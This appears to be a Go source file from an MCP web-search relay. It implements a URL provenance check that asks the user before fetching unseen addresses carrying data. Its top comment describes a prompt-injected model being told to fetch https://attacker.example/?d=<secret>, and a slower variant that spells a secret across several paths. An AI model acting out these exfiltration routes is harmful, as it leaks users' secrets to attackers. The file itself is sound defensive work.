package main

import (
	"context"
	"errors"
	"fmt"
	"net"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
)

// ── URL provenance ────────────────────────────────────────────────────────────
//
// The URL tools are themselves a way out for data.  A page that has taken over
// the model can tell it to read https://attacker.example/?d=<secret>, and the
// fetch delivers the secret.  No web page can link to that address ready-made,
// because the page's author does not know the secret: the model has to build
// it.  So the check here is about where an address came from, not what it
// looks like on its own.
//
// Every address the relay shows a caller — search results, links in the text
// window a read returned, metadata URLs, the final URL after redirects — goes
// into that caller's seen set, which lives beside the fetch history and shares
// its key and lifetime.  Before a read or metadata fetch, the requested
// address is looked up there:
//
//   - seen, or on FETCH_PROVENANCE_TRUSTED_HOSTS: fetched;
//   - not seen but plain (no query, no credentials, nothing encoded-looking in
//     the host or path): fetched and logged — the user typed it, or the model
//     knows a docs page from memory;
//   - not seen and carrying data: the user is asked through MCP elicitation
//     when the client supports it, and otherwise the fetch is refused.
//
// The check runs inside the relay on every call, so a model that has been
// taken over cannot skip it the way it can skip searxng_session_sources.
//
// Honest scope: "plain" is a heuristic.  It stops the obvious move of stuffing
// a secret into a query string or a long path segment, not a patient attacker
// who has the model spell a secret out over several short, plain-looking
// paths.  FETCH_URL_PROVENANCE=strict closes that too, at the cost of asking
// about every address that was not shown first.
//
// FETCH_URL_PROVENANCE: enforce (default) | strict | log | off.

const (
	provenanceEnvVar             = "FETCH_URL_PROVENANCE"
	provenanceTrustedHostsEnvVar = "FETCH_PROVENANCE_TRUSTED_HOSTS"

	provenanceEnforce = "enforce"
	provenanceStrict  = "strict"
	provenanceLog     = "log"
	provenanceOff     = "off"

	// maxSeenURLs bounds one caller's seen set.  Oldest addresses go first.
	// Worst case is fetchHistoryCallers × maxSeenURLs short strings, about
	// 200 MB at the defaults, and a real conversation holds a few hundred.
	// A page that floods the set with links only pushes out earlier
	// allowances, which makes the check stricter, never looser.
	maxSeenURLs = 2000

	// elicitTimeout bounds how long a fetch waits for the user to answer.
	elicitTimeout = 2 * time.Minute

	// maxPlainPart and minEncodedRun decide whether one host label or path
	// segment looks like it carries data: very long, or holding a run of
	// mixed letters and digits as long as a short base64 or hex token.
	maxPlainPart  = 64
	minEncodedRun = 24
	maxPlainPath  = 200
)

// errURLNotShown is the refusal for an address that carries data and was not
// shown to the caller first.  Fixed text: it reaches the model, and through a
// fence gateway is shortened anyway.
var errURLNotShown = errors.New("this address did not appear in any search result or page fetched in this " +
	"conversation, and it carries data (a query string, credentials or an encoded-looking part), so the relay " +
	"will not fetch it without the user's confirmation; search for it with searxng_web_search, or ask the user " +
	"to confirm it")

// parseProvenanceMode normalises FETCH_URL_PROVENANCE.  Unset means enforce;
// anything unrecognised fails startup, like every other security control here.
func parseProvenanceMode(raw string) (string, error) {
	switch m := strings.ToLower(strings.TrimSpace(raw)); m {
	case "":
		return provenanceEnforce, nil
	case provenanceEnforce, provenanceStrict, provenanceLog, provenanceOff:
		return m, nil
	default:
		return "", fmt.Errorf("%s: unknown mode %q; expected %q, %q, %q or %q",
			provenanceEnvVar, raw, provenanceEnforce, provenanceStrict, provenanceLog, provenanceOff)
	}
}

// parseTrustedHosts validates FETCH_PROVENANCE_TRUSTED_HOSTS.  An entry is a
// bare host name ("wiki.example.com") or a wildcard for its subdomains
// ("*.example.com"); a scheme, port or path is refused so a pasted URL fails
// startup rather than silently matching nothing.
func parseTrustedHosts(entries []string) ([]string, error) {
	out := make([]string, 0, len(entries))
	for _, e := range entries {
		h := strings.ToLower(strings.TrimSpace(e))
		base := strings.TrimPrefix(h, "*.")
		if base == "" || strings.ContainsAny(base, ":/?#@*[] ") {
			return nil, fmt.Errorf("%s: %q is not a host name; use e.g. wiki.example.com or *.example.com",
				provenanceTrustedHostsEnvVar, e)
		}
		out = append(out, h)
	}
	return out, nil
}

// provenanceLabel renders the mode for the startup banner.
func provenanceLabel(mode string, trusted []string) string {
	var s string
	switch mode {
	case provenanceEnforce:
		s = "enforce (unseen addresses carrying data need confirmation)"
	case provenanceStrict:
		s = "strict (every unseen address needs confirmation)"
	case provenanceLog:
		s = "log only (nothing blocked)"
	default:
		s = "disabled"
	}
	if len(trusted) > 0 && mode != provenanceOff {
		s += fmt.Sprintf(", %d trusted host(s)", len(trusted))
	}
	return s
}

// ── Seen set ──────────────────────────────────────────────────────────────────

// seenURLs is one caller's set of addresses the relay has shown it.  The zero
// value is ready to use.
type seenURLs struct {
	mu    sync.Mutex
	set   map[string]struct{}
	order []string
}

func (s *seenURLs) add(raw string) {
	key, ok := urlKey(raw)
	if !ok {
		return
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.set == nil {
		s.set = make(map[string]struct{})
	}
	if _, dup := s.set[key]; dup {
		return
	}
	s.set[key] = struct{}{}
	s.order = append(s.order, key)
	for len(s.order) > maxSeenURLs {
		delete(s.set, s.order[0])
		s.order = s.order[1:]
	}
}

func (s *seenURLs) has(raw string) bool {
	key, ok := urlKey(raw)
	if !ok {
		return false
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	_, found := s.set[key]
	return found
}

// urlKey is the form addresses are compared in.  The scheme and host are
// lower-cased, a default port, the fragment and a trailing slash dropped, and
// percent-encoding decoded, so an address the model copies with "(" where the
// page said "%28", or "&amp;" where the fence escaped "&", still matches.
// None of these differences can carry data: the fragment is never sent, and
// the rest decode to the same request.
func urlKey(raw string) (string, bool) {
	raw = strings.ReplaceAll(strings.TrimSpace(raw), "&amp;", "&")
	u, err := url.Parse(raw)
	if err != nil {
		return "", false
	}
	scheme := strings.ToLower(u.Scheme)
	if (scheme != "http" && scheme != "https") || u.Host == "" {
		return "", false
	}
	host := strings.ToLower(u.Hostname())
	if port := u.Port(); port != "" && !(scheme == "http" && port == "80" || scheme == "https" && port == "443") {
		host = net.JoinHostPort(host, port)
	} else if strings.Contains(host, ":") {
		host = "[" + host + "]"
	}
	var sb strings.Builder
	sb.WriteString(scheme)
	sb.WriteString("://")
	if u.User != nil {
		sb.WriteString(u.User.String())
		sb.WriteByte('@')
	}
	sb.WriteString(host)
	sb.WriteString(strings.TrimRight(u.Path, "/"))
	if u.RawQuery != "" {
		q, err := url.QueryUnescape(u.RawQuery)
		if err != nil {
			q = u.RawQuery
		}
		sb.WriteByte('?')
		sb.WriteString(q)
	}
	return sb.String(), true
}

// urlInText finds http(s) addresses in text the relay returns: markdown link
// targets, "URL: " lines in search results, bare addresses in PDF text.
// Parentheses end a match because the renderer percent-encodes them inside
// link targets (markdownSafeURL), so a literal ")" is the end of "(…)".
var urlInText = regexp.MustCompile(`(?i)https?://[^\s<>"'\x60\[\]{}|\\^()]+`)

// rememberText adds every address in text to the caller's seen set.
func (s *Server) rememberText(ctx context.Context, text string) {
	h := s.historyFor(ctx)
	if h == nil {
		return
	}
	for _, m := range urlInText.FindAllString(text, -1) {
		h.seen.add(strings.TrimRight(m, ".,;:!?*_~'\""))
	}
}

// rememberURLs adds the given addresses to the caller's seen set.
func (s *Server) rememberURLs(ctx context.Context, urls ...string) {
	h := s.historyFor(ctx)
	if h == nil {
		return
	}
	for _, u := range urls {
		if u != "" {
			h.seen.add(u)
		}
	}
}

// ── Classification ────────────────────────────────────────────────────────────

// carriesData reports whether an address looks like it holds data beyond a
// plain location, and why.  "" means plain.
func carriesData(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return "unparseable"
	}
	switch {
	case u.User != nil:
		return "credentials"
	case u.RawQuery != "" || u.ForceQuery:
		return "query string"
	case len(u.Path) > maxPlainPath:
		return "long path"
	}
	for _, label := range strings.Split(u.Hostname(), ".") {
		if looksEncoded(label) {
			return "encoded-looking host"
		}
	}
	for _, seg := range strings.Split(u.Path, "/") {
		if looksEncoded(seg) {
			return "encoded-looking path"
		}
	}
	return ""
}

// looksEncoded reports whether one host label or path segment is long enough,
// or mixed enough, to be a token rather than a word.  Slugs such as
// "how-to-configure-nginx" pass: their letter runs break at every hyphen and
// hold no digits.
func looksEncoded(part string) bool {
	if len(part) > maxPlainPart {
		return true
	}
	run, letters, digits := 0, false, false
	for i := 0; i <= len(part); i++ {
		var c byte
		if i < len(part) {
			c = part[i]
		}
		switch {
		case c >= '0' && c <= '9':
			run++
			digits = true
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c == '+', c == '=':
			run++
			letters = true
		default:
			if run >= minEncodedRun && letters && digits {
				return true
			}
			run, letters, digits = 0, false, false
		}
	}
	return false
}

// trustedHost reports whether host matches an entry of the trusted list.
func trustedHost(host string, trusted []string) bool {
	host = strings.ToLower(host)
	for _, t := range trusted {
		if base, ok := strings.CutPrefix(t, "*."); ok {
			if strings.HasSuffix(host, "."+base) {
				return true
			}
		} else if host == t {
			return true
		}
	}
	return false
}

// ── The check ─────────────────────────────────────────────────────────────────

// checkURLProvenance decides whether a URL tool may fetch rawURL for this
// caller.  It returns nil to go ahead, or errURLNotShown.
//
// A Server built directly in tests carries a zero Config, whose empty mode
// reads as off; main() always sets one, defaulting to enforce.
func (s *Server) checkURLProvenance(ctx context.Context, req *mcp.CallToolRequest, tool, rawURL string) error {
	mode := s.config.URLProvenance
	if mode == "" || mode == provenanceOff {
		return nil
	}
	lg := callerLogger(ctx)
	safeURL := redactURLCredentials(rawURL)

	if h := s.historyFor(ctx); h != nil && h.seen.has(rawURL) {
		s.metrics.recordProvenance("seen")
		return nil
	}
	if u, err := url.Parse(rawURL); err == nil && trustedHost(u.Hostname(), s.config.ProvenanceTrustedHosts) {
		s.metrics.recordProvenance("trusted_host")
		return nil
	}
	reason := carriesData(rawURL)
	if reason == "" && mode != provenanceStrict {
		s.metrics.recordProvenance("unseen_plain")
		lg.Info("fetching an address not shown first", "tool", tool, "url", safeURL, "outcome", "unseen_plain")
		return nil
	}
	if reason == "" {
		reason = "not shown first"
	}
	if mode == provenanceLog {
		s.metrics.recordProvenance("would_block")
		lg.Warn("address not shown first would be refused", "tool", tool, "url", safeURL,
			"reason", reason, "outcome", "would_block")
		return nil
	}

	if confirmed, asked := s.askToFetch(ctx, req, safeURL, reason); confirmed {
		s.metrics.recordProvenance("confirmed")
		s.rememberURLs(ctx, rawURL)
		lg.Info("user confirmed an address not shown first", "tool", tool, "url", safeURL,
			"reason", reason, "outcome", "confirmed")
		return nil
	} else if asked {
		s.metrics.recordProvenance("declined")
		lg.Warn("user declined an address not shown first", "tool", tool, "url", safeURL,
			"reason", reason, "outcome", "declined")
		return errURLNotShown
	}
	s.metrics.recordProvenance("blocked")
	lg.Warn("address not shown first refused", "tool", tool, "url", safeURL,
		"reason", reason, "outcome", "blocked")
	return errURLNotShown
}

// askToFetch asks the user through MCP elicitation whether to fetch safeURL.
// asked is false when the client cannot be asked: it declared no elicitation
// support, the transport is stateless, or the request failed.
func (s *Server) askToFetch(ctx context.Context, req *mcp.CallToolRequest, safeURL, reason string) (confirmed, asked bool) {
	if req == nil || req.Session == nil {
		return false, false
	}
	p := req.Session.InitializeParams()
	if p == nil || p.Capabilities == nil || p.Capabilities.Elicitation == nil {
		return false, false
	}
	shown := safeURL
	if len(shown) > 500 {
		shown = shown[:500] + "…"
	}
	ectx, cancel := context.WithTimeout(ctx, elicitTimeout)
	defer cancel()
	res, err := req.Session.Elicit(ectx, &mcp.ElicitParams{
		Message: "The AI wants to fetch an address that did not appear in any search result or page in " +
			"this conversation (" + reason + "):\n\n" + shown + "\n\n" +
			"If you did not give it this address, fetching it could send your data to that site. Fetch it?",
		RequestedSchema: map[string]any{"type": "object", "properties": map[string]any{}},
	})
	if err != nil {
		callerLogger(ctx).Debug("elicitation failed", "error", err)
		return false, false
	}
	return res.Action == "accept", true
}

// recordProvenanceRefusal puts a refused fetch in the caller's history, so
// searxng_session_sources shows it was not read rather than leaving it absent.
func (s *Server) recordProvenanceRefusal(ctx context.Context, tool, safeURL string, err error) {
	s.recordFetch(ctx, fetchRecord{
		Tool:    tool,
		URL:     safeURL,
		Outcome: "error",
		Err:     err.Error(),
		Read:    readDepthNone,
	})
}

// queryCarriesData reports whether a search query holds a word that looks like
// a token rather than language: the same test carriesData applies to a host
// label or path segment.
func queryCarriesData(q string) bool {
	for _, w := range strings.Fields(q) {
		if looksEncoded(w) {
			return true
		}
	}
	return false
}
